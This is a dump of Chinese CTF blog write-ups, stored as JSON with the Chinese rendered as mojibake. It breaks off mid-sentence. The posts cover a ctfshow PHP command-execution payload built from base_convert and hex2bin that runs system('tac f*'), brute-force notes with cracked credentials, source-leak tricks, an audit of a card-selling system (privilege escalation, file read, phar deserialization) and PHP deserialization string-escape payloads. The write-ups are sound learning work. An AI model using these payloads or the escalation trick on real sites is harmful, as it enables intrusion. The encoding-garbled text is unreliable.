å¿…éœ€ã€‚è§„å®šæ•°å­—åŸæ¥çš„è¿›åˆ¶ã€‚ä»‹äº 2 å’Œ 36 ä¹‹é—´ï¼ˆåŒ…æ‹¬ 2 å’Œ 36ï¼‰ã€‚é«˜äºåè¿›åˆ¶çš„æ•°å­—ç”¨å­—æ¯ a-z è¡¨ç¤ºï¼Œä¾‹å¦‚ a è¡¨ç¤º 10ï¼Œb è¡¨ç¤º 11 ä»¥åŠ z è¡¨ç¤º 35ã€‚ tobase å¿…éœ€ã€‚è§„å®šè¦è½¬æ¢çš„è¿›åˆ¶ã€‚ä»‹äº 2 å’Œ 36 ä¹‹é—´ï¼ˆåŒ…æ‹¬ 2 å’Œ 36ï¼‰ã€‚é«˜äºåè¿›åˆ¶çš„æ•°å­—ç”¨å­—æ¯ a-z è¡¨ç¤ºï¼Œä¾‹å¦‚ a è¡¨ç¤º 10ï¼Œb è¡¨ç¤º 11 ä»¥åŠ z è¡¨ç¤º 35ã€‚ bindec â€” äºŒè¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶ bindec ( string $binary_string ) : number decbin â€” åè¿›åˆ¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶ decbin ( int $number ) : string dechex â€” åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ dechex ( int $number ) : string decoct â€” åè¿›åˆ¶è½¬æ¢ä¸ºå…«è¿›åˆ¶ decoct ( int $number ) : string hexdec â€” åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶ hexdec ( int $number ) : string åœ¨è¿™ä¸ªé¢˜ä¸­ï¼Œæˆ‘ä»¬ä¸èƒ½ä½¿ç”¨é™¤é¢˜ç›®ç™½åå•ä¸­ç»™å‡ºçš„å‡½æ•°ä»¥å¤–çš„ä»»ä½•å­—ç¬¦ã€‚é‚£æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯æ„é€ å‡ºå­—æ¯æˆ–è€…æ„é€ å‡ºå‡½æ•°ã€‚å‡è®¾æˆ‘ä»¬è¦æ„é€ å‡ºå¦‚ä¸‹è¡¨è¾¾å¼ c=$_GET[a]($_GET[b])&amp;a=system&amp;b=cat flag æˆ‘ä»¬éœ€è¦æ„é€ çš„æ˜¯å…¶å®åªæœ‰ _GETï¼Œ$æˆ‘ä»¬å¯ç”¨ä½¿ç”¨ï¼Œä¸­æ‹¬å·å¯ç”¨ç”¨èŠ±æ‹¬å·ä»£æ›¿ï¼Œå°æ‹¬å·ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„ã€‚è¿™æ—¶å€™æˆ‘ä»¬æƒ³åˆ°äº†ä¸€ä¸ªåŠæ³•ï¼Œå¦‚æœå¯ä»¥æ„é€ å‡ºhex2binå‡½æ•°å°±å¯ä»¥å°†16è¿›åˆ¶è½¬æ¢æˆå­—ç¬¦ä¸²äº†ã€‚æˆ‘ä»¬åˆå¯ä»¥ç”¨decoctå°†10è¿›åˆ¶è½¬æ¢æˆ16è¿›åˆ¶ã€‚ä¹Ÿå°±æ˜¯å¯ä»¥å°†10è¿›åˆ¶è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œhex2binæ€ä¹ˆæ„é€ å‘¢ï¼Œè¿™æ—¶å€™å°±éœ€è¦ç”¨åˆ°base_convertäº†ã€‚æˆ‘ä»¬å‘ç°36è¿›åˆ¶ä¸­åŒ…å«äº†æ‰€æœ‰çš„æ•°å­—å’Œå­—æ¯ï¼Œæ‰€æœ‰åªéœ€è¦å°†hex2binæŒ‰ç…§36è¿›åˆ¶è½¬æ¢æˆ10è¿›åˆ¶å°±å¯ä»¥äº†ã€‚ echo base_convert(&#39;hex2bin&#39;, 36, 10); ç»“æœ 37907361743 echo hexdec(bin2hex(&quot;_GET&quot;)); ç»“æœ 1598506324 ç°åœ¨æˆ‘ä»¬è¦åšçš„å°±æ˜¯åè¿‡æ¥äº† base_convert(&#39;37907361743&#39;,10,36); hex2bin base_convert(&#39;37907361743&#39;,10,36)(dechex(&#39;1598506324&#39;)); _GET c=$pi=_GET;$$pi{abs}($$pi{acos})&amp;abs=system&amp;acos=tac f* payload payload:c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos})&amp;abs=system&amp;acos=tac f* æ€»ç»“ï¼šhex2binæŠŠ16è¿›åˆ¶è½¬å­—ç¬¦ï¼ŒdechexæŠŠ16è¿›åˆ¶è½¬æ²¡æœ‰å­—ç¬¦çš„åè¿›åˆ¶ï¼Œè¿™æ ·ä¾¿æ˜¯å…¨æ•°å­—äº†ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"Web21-28çˆ†ç ´","slug":"Web21-28çˆ†ç ´","date":"2021-07-26T08:18:40.000Z","updated":"2021-07-26T08:30:39.339Z","comments":true,"path":"2021/07/26/Web21-28çˆ†ç ´/","link":"","permalink":"/2021/07/26/Web21-28çˆ†ç ´/","excerpt":"","text":"Web21çˆ†ç ´ä½ç½®ä¸ºadmin:{} è½½å…¥å­—å…¸ï¼Œbase64ç¼–ç  çˆ†ç ´å¾—å¯†ç ä¸ºshark63 Web22flag{ctf_show_web}è¿™é¢˜flagè—çš„æœ‰ç‚¹ç¦»è°±ï¼Œä¼šçˆ†ç ´å­åŸŸåå³å¯ã€‚ Web23æ„é€ md5è‡ªå·±å†™äº†ä¸ªpyè„šæœ¬ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç…§ç€æºç æ”¹ï¼Œé‚£æ ·æ›´å¿«ã€‚ä½†æ˜¯è¿˜æ˜¯æ¨èè‡ªå·±å†™ä¸ªpyçš„ï¼Œå¯¹è‡ªå·±çš„å¸®åŠ©æ›´å¤§ã€‚ import hashlib dic = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;.encode(&quot;utf-8&quot;) for a in dic: for b in dic: for c in dic: t = (chr(a)+chr(b)+chr(c)) md5 = hashlib.md5(t.encode(encoding=&#39;UTF-8&#39;)).hexdigest() if md5[1:2] == md5[14:15] and md5[14:15] == md5[17:18]: c = md5[1:2] d = md5[14:15] e = md5[17:18] f = md5[31:32] try: if (int((int(md5[1:2]) + int(md5[14:15]) + int(md5[17:18])) / int(md5[1:2])) == int(md5[31:32])): print(t) print(&#39;success!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&#39;) except ZeroDivisionError: print(&#39;0ä¸èƒ½ä¸ºè¢«é™¤æ•°ï¼&#39;) except Exception as r: print(&#39;æœªçŸ¥é”™è¯¯ %s&#39; % (r)) å¥½ä¹…æ²¡åŠ¨æ‰‹äº†ï¼Œå†™å¾—æœ‰ç‚¹åƒåœ¾ï¼Œè§è°…ã€‚ Web24mt_scrand(seed)è¿™ä¸ªå‡½æ•°çš„æ„æ€ï¼Œæ˜¯é€šè¿‡åˆ†å‘seedç§å­ï¼Œç„¶åç§å­æœ‰äº†åï¼Œé mt_rand()ç”Ÿæˆéšæœºæ•°ã€‚ä¼ªéšæœºæ•°ã€‚ Web25ä¹Ÿæ˜¯php seedçš„çŸ¥è¯†ç‚¹ï¼Œåˆšå…¥å‘çš„æ—¶å€™å°±åšè¿‡äº†ï¼Œæ‡’å¾—å†™äº†ï¼Œå› ä¸ºè¿™ä¸œè¥¿å·²ç»æ²¡ä»€ä¹ˆç”¨äº†ã€‚ Web26ä¸¤ä¸ªæ–¹æ³•ã€‚ä¸€ä¸ªæ˜¯æ­£å¸¸çˆ†ç ´å‡ºå¯†ç 7758521å¦ä¸€ä¸ªæ˜¯postä¼ å‚a=&amp;p=&amp;d=&amp;u=&amp;pass=åŸå› æˆ‘ä¹Ÿä¸æ¸…æ¥šã€‚ Web27è´¦å· 02015237å¯†ç  621022199002015237 Web28/72/20/ æ€»ç»“çˆ†ç ´éƒ¨åˆ†è´¨é‡ä¸é«˜ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"Web1-20ä¿¡æ¯æ”¶é›†","slug":"Web1-20ä¿¡æ¯æ”¶é›†","date":"2021-07-26T08:18:33.000Z","updated":"2021-07-26T08:28:42.109Z","comments":true,"path":"2021/07/26/Web1-20ä¿¡æ¯æ”¶é›†/","link":"","permalink":"/2021/07/26/Web1-20ä¿¡æ¯æ”¶é›†/","excerpt":"","text":"##å‰è¨€åäº‹å„¿äº†ï¼ŒæœŸæœ«å®šçš„è®¡åˆ’åˆ°ç°åœ¨æ²¡ä¸€å¤©å®Œæˆçš„ã€‚æ— å¥ˆé€‚åº”æ–°ç¯å¢ƒå¤ªç´¯ï¼Œåªèƒ½ä»ä»Šå¤©å¼€å§‹æ…¢æ…¢è¡¥èµ·æ¥ã€‚ Web1flagåœ¨æºç å†…ï¼Œè¿™é‡Œç»™å‡ºå››ç§æ–¹æ³•ï¼š1ã€f12æŸ¥çœ‹æºç  2ã€view-sourceå¦‚æœå¯ä»¥å³é”®ï¼Œç›´æ¥å³é”®-æŸ¥çœ‹æºä»£ç å³å¯ã€‚å¦‚æœä¸è¡Œï¼Œç›´æ¥åœ¨urlå‰é¢æ‰‹åŠ¨åŠ ä¸Šview-sourceï¼š 3ã€æŸ¥çœ‹è¿”å›åŒ…burpsuiteæŠ“åŒ…ã€‚ 4ã€curlå‘½ä»¤ Web2æ²¡æ³•å³é”®ï¼Œæ–¹æ³•è§Web1 Web3æŠ“è¿”å›åŒ…ï¼ŒburpsuiteæŠ“åŒ…æˆ–è€…ç›´æ¥æµè§ˆå™¨å†…f12æŸ¥çœ‹networkï¼š Web4robots.txtåçˆ¬è™«æ–‡ä»¶ã€‚ Web5index.phps æºç æ³„éœ²ã€‚ Web6www.zipæºç æ³„éœ²ï¼Œè®¿é—®fl000g.txt Web7gitæ³„éœ²/.git/index.php Web8svnæ³„éœ²/.svn/ Web9vimå¼‚å¸¸é€€å‡ºäº§ç”Ÿçš„éšè—æ–‡ä»¶index.php.swp Web10f12æŸ¥çœ‹networkè¿”å›åŒ…æœ‰ç‰¹æ®Šç¼–ç çš„è¯ç”¨urlè§£ç  Web11dnsæ£€æŸ¥ https://zijian.aliyun.com/ Web12æœ€ä¸‹é¢ä¸ºadminå¯†ç  Web13æœ€ä¸‹é¢documentæŠ€æœ¯æ–‡æ¡£æ³„éœ²åå°åŠé»˜è®¤è´¦å·ã€‚ Web14http://74dfd577-0194-4271-8271-51df0ff6242d.challenge.ctf.show:8080/editor/php/file_manager_json.php?path=/var/www/html/nothinghere/ http://74dfd577-0194-4271-8271-51df0ff6242d.challenge.ctf.show:8080/nothinghere/fl000g.txt kindeditorçš„ä¸€ä¸ªday Web15é‚®ç®±æ³„éœ²ä¸ªäººä¿¡æ¯ admin admin7789 Web16tz.php Web17http://ping.chinaz.com/ ping www.ctfshow.comè¿™ä¸ªåº”è¯¥æ˜¯çŒœä¸¤ä¸ªåŸŸååœ¨åŒä¸€ipä¸‹ã€‚ Web18æœ€ç®€å•çš„jsï¼Œç›´æ¥æ‰¾æºç çœ‹èµ¢äº†çš„ç»“æœã€‚110.php Web19burp postè¯·æ±‚ Web20db/db.mdb æ€»ç»“ä¿¡æ¯æœé›†éƒ¨åˆ†æ¯”è¾ƒç®€å•ï¼Œéƒ½æ˜¯å…¥é—¨æ•™ç¨‹ï¼Œä»…ä½œäº†è§£å³å¯ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"faka","slug":"faka","date":"2021-06-21T14:40:56.000Z","updated":"2021-06-21T14:45:39.676Z","comments":true,"path":"2021/06/21/faka/","link":"","permalink":"/2021/06/21/faka/","excerpt":"","text":"æœ€è¿‘æ­£å¥½åœ¨å­¦ä¹ ä»£ç å®¡è®¡ï¼Œä½†æ˜¯å› ä¸ºæœŸæœ«çš„åŸå› ï¼Œä¸€äº›å¤§çš„cmséƒ½æ²¡æœ‰è€å¿ƒä»”ç»†é’»ç ”ã€‚ä»Šå¤©å¶ç„¶åœ¨å®‰å…¨å®¢ä¸Šçœ‹åˆ°ä¸ªå¾ˆä¹…ä¹‹å‰åšè¿‡çš„å‘å¡ç³»ç»Ÿï¼Œå½“æ—¶å› ä¸ºæ²¡æœ‰ä»”ç»†ç ”ç©¶å¯¼è‡´å°è±¡ä¸æ·±ï¼Œä»Šå¤©å°±ä»¥å®¡è®¡çš„è§’åº¦å†æ¥çœ‹çœ‹è¿™é“é¢˜ã€‚é“¾æ¥ï¼šhttps://www.anquanke.com/post/id/243357https://blog.csdn.net/rfrder/article/details/115067196 è¶Šæƒéšä¾¿è®¿é—®manageä¸‹çš„ä¸€ä¸ªè·¯ç”± /manage/Goodsï¼Œéƒ½ä¼šè·³è½¬åˆ°ç™»é™†ç•Œé¢ã€‚çœ‹ä¸€ä¸‹è®¿é—®adminèŠ‚ç‚¹æ‰€éœ€è¦çš„æƒé™ï¼š å†çœ‹ä¸‹system/nodeè¿™ä¸ªè¡¨ï¼Œis_authä»£è¡¨éœ€è¦æƒé™éªŒè¯ï¼Œis_loginä»£è¡¨éœ€è¦ç™»å½•ï¼Œé‚£ä¹ˆçœ‹is_authä¸º0çš„åœ°æ–¹å°±æœ‰å¯èƒ½å­˜åœ¨è¶Šæƒã€‚ æ¼æ´ç‚¹ï¼šapplication/admin/controller/Index.php è·Ÿè¿›ä¸‹é¢çš„postå¤„ç†ï¼ŒæŠŠpostå‚æ•°ç»™$dataï¼Œç„¶åæŠŠpasswordç»™md5,å†å¯¹$dataè°ƒç”¨_form_filterè¿™ä¸ªå›è°ƒæ–¹æ³•ï¼š _formé‡Œé¢é‚£ä¸ªarray_mergeå°†æ‰€æœ‰postè¯·æ±‚å­˜å…¥æ•°ç»„ï¼Œä¸‹é¢è¿™_form_filteråˆç”¨authorizeåˆ¤å®šæƒé™ï¼Œå†ç»“åˆæˆ‘ä»¬ä¸€å¼€å§‹åˆ†æçš„æ•°æ®åº“ï¼Œè¿™é‡Œåªè¦postä¸ªauthorize=3å³å¯ï¼š æˆåŠŸåˆ›å»ºé«˜æƒé™è´¦å·ã€‚ä½†æ˜¯æœ‰ä¸€ç‚¹æ²¡ææ˜ç™½ï¼Œå°±æ˜¯ï¼š ä¸çŸ¥é“è¿™é‡Œå’‹è°ƒè¯•çš„ï¼Œæˆ‘åœ¨æœ¬åœ°æ­äº†ç¯å¢ƒä¸€ç›´è¿ä¸ä¸Šæ•°æ®åº“ä¸çŸ¥é“ç”šä¹ˆåŸå› ã€‚è¿˜æœ‰å°±æ˜¯è¶Šæƒæ ¹æœ¬åŸå› ï¼ŒæŒ‰ä¸‹å›¾æ‰€ç¤ºï¼Œadminä¸‹çš„èŠ‚ç‚¹éƒ½æ˜¯è¢«æ§åˆ¶çš„ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿˜ä¼šè¢«ç»•è¿‡å‘¢ï¼Ÿ è¿™å°±è¦çœ‹åˆ¤æ–­æƒé™çš„ä»£ç ï¼š è¿™é‡Œæœ‰é»˜è®¤å€¼ï¼Œnodeæ— è®ºå¦‚ä½•ä¸å¯èƒ½ä¸ºadminï¼Œå°±ç®—è®¿é—®/ä¹Ÿæ˜¯index/index/indexã€‚ ä»»æ„æ–‡ä»¶è¯»å–è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œseayéƒ½æ‰«å‡ºæ¥äº†ï¼š æ–‡ä»¶ä¸Šä¼  åé¢è°ƒç€è°ƒç€å¿˜è®°å†™äº†ï¼Œçœ‹å¼€å§‹çš„ä¸¤ä¸ªé“¾æ¥å°±è¡Œã€‚è¿™ä¸ªåœ°æ–¹ä¹Ÿä¸æ˜¯å¾ˆéš¾ã€‚æœ€åé‚£é‡Œæ§åˆ¶åç¼€åè¿˜ç»™æˆ‘ä¸€ç§æ•…æ„æ”¾äº†ä¸ªæ¼æ´çš„æ„Ÿè§‰ï¼Œä¸çŸ¥é“å¼€å‘è€…ä¸ºå•¥è¦è¿™ä¹ˆå†™ï¼š å¼ºåˆ¶æ‹¼æ¥å®ƒä¸å¥½ä¹ˆ pharååºåˆ—åŒ–pharååºåˆ—åŒ–ç»™æˆ‘çš„æ„Ÿè§‰æ˜¯çŸ¥é“ä½†ä¸äº†è§£ï¼Œéšç€å­¦ä¹ çš„æ·±å…¥ï¼Œæˆ‘å¿…é¡»å¯¹è¿™äº›åŸºæœ¬çš„çŸ¥è¯†å»é‡æ–°æŒ–æ˜ä¸€ä¸‹ã€‚ å‚è€ƒï¼šhttps://www.anquanke.com/post/id/243357#h2-3 æ€»ç»“æœ€è¿‘ä¸€ä¸ªæœˆè„‘å­éå¸¸ä¹±ï¼Œä¸€åº¦æƒ³æ”¾å¼ƒå®‰å…¨è½¬å¼€å‘ï¼Œä½†æ˜¯æœ€è¿‘ä¸€æ˜ŸæœŸå‘ç”Ÿçš„è®¸å¤šäº‹æƒ…è®©æˆ‘åšå®šäº†åœ¨å®‰å…¨è¿™æ¡è·¯ä¸Šèµ°ä¸‹å»çš„å†³å¿ƒã€‚æš‚ä¸”å®šä¸€ä¸‹æš‘æœŸçš„ä»»åŠ¡ï¼š1ã€å®ä¹ ä¸¤ä¸ªæœˆã€‚2ã€æ¯å¤©éƒ½å¿…é¡»å­¦ä¸€äº›æ–°çš„çŸ¥è¯†å¹¶æ·±å…¥æ¢ç´¢å…¶åŸç†ï¼ŒCTFé¢˜ç›®æˆ–æ˜¯å¤ç°æ¼æ´ã€‚3ã€å†²ä¸€å†²srcã€‚4ã€æœ‰ç©ºå­¦ä¸€å­¦javaã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"NEWSCTF_2021.6-Webå¤ç°","slug":"NEWSCTF-Webå¤ç°","date":"2021-06-05T09:46:54.000Z","updated":"2021-06-06T08:26:27.789Z","comments":true,"path":"2021/06/05/NEWSCTF-Webå¤ç°/","link":"","permalink":"/2021/06/05/NEWSCTF-Webå¤ç°/","excerpt":"","text":"è™½ç„¶å·²ç»ä¸æ‰“CTFäº†ï¼Œä½†æ˜¯è¿˜æ˜¯è¦å­¦ä¹ ã€‚æ¯”èµ›å½“å¤©çœ‹äº†ä¸€éé¢˜è§‰å¾—è¿˜è¡Œï¼Œæ˜¨å¤©wpå‡ºäº†æ¥å¤ç°ä¸€ä¸‹ã€‚çœ‹äº†wpï¼Œé¢˜ç›®éš¾åº¦ä¸­ç­‰ï¼Œè™½ç„¶éƒ½æ˜¯è§è¿‡çš„çŸ¥è¯†ç‚¹ï¼Œä½†æ˜¯å‡ºçš„ä¹Ÿå¾ˆä¸é”™ã€‚ ä¸€ã€easy_webè¿™ä¸ªå°±ä¸è¯´äº†ï¼Œç®€å•é¢˜ã€‚ webp=123456&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806 äºŒã€weblog &lt;?php highlight_file(__FILE__); error_reporting(0); class B{ public $logFile; public $initMsg; public $exitMsg; function __construct($file){ // initialise variables $this-&gt;initMsg=&quot;#--session started--#\\n&quot;; $this-&gt;exitMsg=&quot;#--session end--#\\n&quot;; $this-&gt;logFile = $file; readfile($this-&gt;logFile); } function log($msg){ $fd=fopen($this-&gt;logFile,&quot;a+&quot;); fwrite($fd,$msg.&quot;\\n&quot;); fclose($fd); } function __destruct(){ echo &quot;this is destruct&quot;; } } class A { public $file = &#39;flag{xxxxxxxx}&#39;; public $weblogfile; function __construct() { echo $this-&gt;file; } function __wakeup(){ // self::waf($this-&gt;filepath); $obj = new B($this-&gt;weblogfile); } public function waf($str){ $str=preg_replace(&quot;/[&lt;&gt;*#&#39;|?\\n ]/&quot;,&quot;&quot;,$str); $str=str_replace(&#39;flag&#39;,&#39;&#39;,$str); return $str; } function __destruct(){ echo &quot;this is destruct&quot;; } } class C { public $file; public $weblogfile; } class D{ public $logFile; public $initMsg; public $exitMsg; } function is_serialized($data){ $r = preg_match_all(&#39;/:\\d*?:&quot;/&#39;,$data,$m,PREG_OFFSET_CAPTURE); if(!empty($r)) { foreach($m[0] as $v){ $a = intval($v[1])+strlen($v[0])+intval(substr($v[0],1)); if($data[$a] !== &#39;&quot;&#39;) return false; } } if(!is_string($data)) return false; $data = trim($data); if(&#39;N;&#39; === $data) return true; if(!preg_match(&#39;/^([adObis]):/&#39;,$data,$badions)) return false; switch($badions[1]){ case &#39;a&#39;: case &#39;O&#39;: case &#39;s&#39;: if(preg_match( &quot;/^{$badions[1]}:[0-9]+:.*[;}]\\$/s&quot;, $data ) ) return true; break; case &#39;b&#39;: case &#39;i&#39;: case &#39;d&#39;: if(preg_match(&quot;/^{$badions[1]}:[0-9.E-]+;\\$/&quot;, $data)) return true; break; } return false; } $log = $_GET[&#39;log&#39;]; if(!is_serialized($log)){ die(&#39;no1&#39;); } $log1 = preg_replace(&quot;/A/&quot;,&quot;C&quot;,$log); $log2 = preg_replace(&quot;/B/&quot;,&quot;D&quot;,$log1); if(!unserialize($log2)){ die(&#39;no2&#39;); } $log = preg_replace(&quot;/[&lt;&gt;*#&#39;|?\\n ]/&quot;,&quot;&quot;,$log); $log = str_replace(&#39;flag&#39;,&#39;&#39;,$log); $log_unser = unserialize($log); ?&gt; çœ‹ç€é•¿ï¼Œå…¶å®ç®€å•çš„å¾ˆã€‚é¦–å…ˆæŠ›å¼€wafä¸çœ‹ã€‚Aç±»æ§åˆ¶å‚æ•°ï¼ŒBç±»readfileï¼Œè€ŒAç±»ä¸‹wakeupä¸‹æ­£å¥½æœ‰ä¸ªè°ƒç”¨Bç±»çš„objã€‚æ‰€ä»¥ç›´æ¥ &lt;?php class A { public $file; public $weblogfile; } $a=new A(); $a-&gt;weblogfile=&#39;flag.php&#39;; echo serialize($a); ?&gt; å³å¯ï¼Œä½†æ˜¯è‚¯å®šä¸ä¼šè¿™ä¹ˆç®€å•çš„ï¼Œå…³é”®åœ¨è¿™é‡Œï¼š åœ¨å‰é¢ç”¨:&lt;8ç»•è¿‡äº† $r = preg_match_all(&#39;/:\\d*?:&quot;/&#39;,$data,$m,PREG_OFFSET_CAPTURE); ä¹‹åï¼Œä¼ åˆ°log2é‚£é‡Œå°±å˜æˆäº†è¿™æ ·ï¼š O:1:&quot;C&quot;:2:{s:4:&quot;file&quot;;s:14:&quot;flag{xxxxxxxx}&quot;;s:10:&quot;weblogfile&quot;;s:&lt;8:&quot;fflaglag.php&quot;;} æ˜¾ç„¶è¿™æ˜¯æ— æ³•æˆåŠŸååºåˆ—åŒ–çš„ï¼Œæˆ‘ä»¬éœ€è¦è®©å­—ç¬¦é€ƒé€¸ï¼Œé•¿åº¦ä¸º25 &quot;;s:10:&quot;weblogfile&quot;;s:40: åˆ©ç”¨flagå’Œä¸€å †ç¬¦å·éƒ½èƒ½æ¢ç©ºçš„ç‰¹ç‚¹ï¼š &lt;?php class A { public $file=&#39;flagflagflagflagflagflag&lt;&#39;; public $weblogfile=&#39;;s:10:&quot;weblogfile&quot;;s:&lt;8:&quot;flflagag.php&quot;;}&#39;; } echo serialize (new A); è¿™æ ·ä¼ åˆ°log2é‚£é‡Œå°±å˜æˆäº†ï¼š O:1:&quot;C&quot;:2:{s:4:&quot;file&quot;;s:25:&quot;flagflagflagflagflagflag&lt;&quot;;s:10:&quot;weblogfile&quot;;s:40:&quot;;s:10:&quot;weblogfile&quot;;s:&lt;8:&quot;flflagag.php&quot;;}&quot;;} å˜æˆäº†å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥æ­£å¸¸æ‰§è¡Œã€‚ç®€å•é¢˜ã€‚ ä¸‰ã€webloginçœ‹äº†æç¤ºå¥½åƒåˆæ˜¯ä¸ªphpååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ã€‚ã€‚ã€‚è¿™ä¸ªæˆ‘æ‡‚ï¼Œååºåˆ—åŒ–é€ƒé€¸å¥½å‡ºå¹¶ä¸”çœ‹èµ·æ¥æ¯”è¾ƒéš¾ï¼Œæˆ‘æœ€è¿‘ä¹Ÿå‡ºäº†ä¸€ä¸ªå­—ç¬¦ä¸²é€ƒé€¸çš„ï¼Œä¸è¿‡æ²¡è¿™ä¹ˆå¤æ‚ã€‚ æºç å¾ˆé•¿ï¼Œæ˜¯ä¸€ä¸ªå¤„ç†ç”¨æˆ·çš„è·¯ç”±ã€‚è¿™ç§å¾ˆé•¿çš„æºç ç›´æ¥å€’æ¨ï¼Œå…ˆæ‰¾flagè¾“å‡ºç‚¹ï¼š çœ‹èµ·æ¥æ˜¯è¦å†™ä¸ªæ»¡è¶³æ¡ä»¶çš„æ–‡ä»¶æ‰ä¼šè¾“å‡ºflagã€‚å…¨å±€æœç´¢file_putï¼Œæ‰¾åˆ°å››ä¸ªå…¨æ˜¯ file_put_contents($file,enc(serialize($p)));æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªencï¼š function enc($str){ $_str = &#39;&#39;; for($i=0;$i&lt;strlen($str);$i++){ if ($str[$i] !== &#39;=&#39;){ $_str = $_str.&#39;=&#39;.dechex(ord($str[$i])); }else{ $_str = $_str.$str[$i].$str[$i+1].$str[$i+2]; $i = $i+2; } } return $_str; } è¯•ä¸€ä¸‹ï¼š è½¬æ¢æˆç­‰å·åŠ 16è¿›åˆ¶çš„asciiç ã€‚ä½†æ˜¯ä¸‹é¢é‚£ä¸ªi+2å¾ˆæ˜æ˜¾è¯´æ˜äº†ä¸ä¼šå¤„ç†å·²ç»ç¼–ç è¿‡çš„ï¼Œæ¯”å¦‚ï¼š æœ‰å•¥ç”¨å‘¢ï¼Œè¿™å°±å¾—çœ‹ä¸‹é¢ååºåˆ—åŒ–é‡Œé¢çš„ä¼ªåè®®ï¼š $p = unserialize(filter(file_get_contents(&#39;php://filter/read=convert.quoted-printable-decode/resource=&#39;.$file))); ç®€å•ç‚¹è¯´å°±æ˜¯æŠŠä¸Šé¢ç¼–ç è¿‡çš„è§£ç ï¼Œæ¯”å¦‚=31å˜æˆ1ï¼Œå­—ç¬¦å‡å°‘äº†ä¸¤ä¸ªã€‚æ¥ä¸‹æ¥çœ‹æ§åˆ¶ç”Ÿæˆæ–‡ä»¶çš„åœ°æ–¹ï¼š datafileå¯æ§ã€‚ class Action { public $data=array(); public $username=&#39;Troy3e&#39;; public $password=&#39;Troy3e&#39;; public $datafile=&#39;flag01476f0ab4de69015b1b6e07a0e84095&#39;; public $act=&#39;register&#39;; } echo serialize(new Action()); //O:6:&quot;Action&quot;:5:{s:4:&quot;data&quot;;a:0:{}s:8:&quot;username&quot;;s:6:&quot;Troy3e&quot;;s:8:&quot;password&quot;;s:6:&quot;Troy3e&quot;;s:8:&quot;datafile&quot;;s:36:&quot;flag01476f0ab4de69015b1b6e07a0e84095&quot;;s:3:&quot;act&quot;;s:8:&quot;register&quot;;} ä½†æ˜¯åœ¨è¿™é‡Œé¢actionæ— æ³•æ§åˆ¶ï¼Œç„¶è€Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶usernameå’Œpasswordï¼Œè¿˜æ˜¯é‚£å¥è¯ï¼Œæ°¸è¿œä¸è¦ç›¸ä¿¡ç”¨æˆ·çš„è¾“å…¥ã€‚ &lt;?php class Action { public $data=array(&#39;Troy3e&#39;,&#39;Troy3e&#39;); public $username=&#39;&#39;; public $password=&#39;&#39;; public $datafile=&#39;&#39;; public $act=&#39;&#39;; } echo serialize(new Action()); ?&gt; //O:6:&quot;Action&quot;:5:{s:4:&quot;data&quot;;a:2:{i:0;s:6:&quot;Troy3e&quot;;i:1;s:6:&quot;Troy3e&quot;;}s:8:&quot;username&quot;;s:0:&quot;&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;s:8:&quot;datafile&quot;;s:0:&quot;&quot;;s:3:&quot;act&quot;;s:0:&quot;&quot;;} åˆ°è¿™å…¶å®å°±å¾ˆæ˜æ˜¾äº†usernameå¤„æ§åˆ¶é•¿åº¦é€ƒé€¸å‡ºæ•°ç»„ï¼Œpasswordé‡Œé¢æ˜¯æˆ‘ä»¬æ§åˆ¶çš„ååºåˆ—åŒ–çš„å†…å®¹ã€‚ åä¸ªã€‚åé¢å°±ä¸å¤šè¯´äº†ï¼Œç›´æ¥è´´ä¸ªå®˜æ–¹payloadï¼š username==50=50=50=50=50&amp;password=a&quot;;s:1:&quot;a&quot;;}s:8:&quot;username&quot;;s:9:&quot;lastsward&quot;;s:8:&quot;password&quot;;s:9:&quot;lastsward&quot;;s:8:&quot;datafile&quot;;s:36:&quot;flagf528764d624db129b32c21fbca0cb8d6&quot;;s:3:&quot;act&quot;;s:8:&quot;register&quot;;} å››ã€impossible ipåé¢é‚£ä¸ªssrfæ‰“fpmå·²ç»åšçƒ‚äº†å°±ä¸è®²äº†ï¼Œçœ‹ä¸€ä¸‹å‰é¢è¿™ä¸ªsocketã€‚ è¿™ä¸ªçŸ¥è¯†ç‚¹æˆ‘å€’æ˜¯æ²¡è§è¿‡ï¼Œå­¦ä¹ äº†ã€‚ æ€»ç»“ï¼šé—²ç€æ²¡äº‹ï¼Œå°±çœ‹å››ä¸ªã€‚è¿™å‡ 